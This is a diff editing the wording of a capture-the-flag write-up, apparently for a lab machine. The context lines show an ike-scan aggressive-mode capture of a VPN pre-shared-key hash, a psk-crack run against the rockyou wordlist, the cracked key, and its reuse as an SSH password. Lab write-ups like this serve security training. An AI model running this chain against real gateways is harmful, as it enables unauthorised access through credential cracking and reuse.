@@ -98,7 +98,7 @@ ike-scan -M -A -n --id=rtr-remote --pskcrack=hash.txt 10.129.4.89
 ```
 ![hash](/assets/img/expressway/image%2010.png)
 
-We successfully tricked the router to give the PSK hash by abusing how the [aggressive mode works](https://community.fortinet.com/t5/FortiGate/Technical-Tip-Differences-between-Aggressive-and-Main-mode-in/ta-p/196313)
+We successfully tricked the router to give the authentication hash by abusing how the [aggressive mode works](https://community.fortinet.com/t5/FortiGate/Technical-Tip-Differences-between-Aggressive-and-Main-mode-in/ta-p/196313)
 
 ### Crack the hash
 ```
@@ -106,10 +106,11 @@ psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
 ```
 ![cracked hash](/assets/img/expressway/image%2011.png)
 
-Cracked PSK: `freakingrockstarontheroad`
+Cracked hash: `freakingrockstarontheroad`
+Nice! we got the PSK.
 
 ### Login into the SSH
-We can try to reuse the cracked PSK as the password for the SSH login
+We can try to reuse the recovered PSK as the password for the SSH login
 ```
 ssh ike@10.129.4.89
 password: freakingrockstarontheroad
